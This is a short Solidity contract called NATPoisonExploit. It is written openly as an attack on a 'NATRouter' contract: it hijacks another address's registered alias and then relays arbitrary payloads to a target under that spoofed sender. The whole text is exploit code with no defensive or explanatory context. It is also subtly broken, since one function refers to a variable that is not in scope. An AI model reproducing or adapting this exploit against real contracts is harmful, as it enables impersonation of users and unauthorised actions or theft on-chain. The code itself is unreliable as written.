contract NATPoisonExploit {
    NATRouter public router;
    address public attacker;

    constructor(address _router) {
        router = NATRouter(_router);
        attacker = msg.sender;
    }

    function hijackAlias(address targetAlias) external {
        router.registerAlias(targetAlias); // replaces original NAT mapping
    }

    function executeSpoof(address target, bytes calldata payload) external {
        router.relay(targetAlias, target, payload); // spoofed sender relayed
    }
}
